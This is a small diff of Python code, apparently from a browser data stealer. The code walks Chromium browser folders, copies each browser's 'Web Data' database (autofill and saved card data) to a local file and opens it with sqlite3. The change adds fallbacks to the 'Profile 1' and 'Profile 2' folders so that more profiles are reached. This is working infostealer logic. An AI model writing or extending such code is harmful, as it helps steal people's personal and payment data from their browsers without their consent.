@@ -200,7 +200,12 @@ if yes == "yes":
 					if not os.path.exists(chromiumpaths[i]):
 						continue
 					path = str(chromiumpaths[i] + "\\User Data\\"+"\\Default\\Web Data")
-
+					if not os.path.exists(path):
+						path = str(chromiumpaths[i] + "\\User Data\\"+"\\Profile 1\\Web Data")
+						if not os.path.exists(path):
+							path = str(chromiumpaths[i] + "\\User Data\\"+"\\Profile 2\\Web Data")
+							if not os.path.exists(path):
+								continue
 					shutil.copy(path, "webdata.db")
 					path = "webdata.db"
 					db = sqlite3.connect(path)
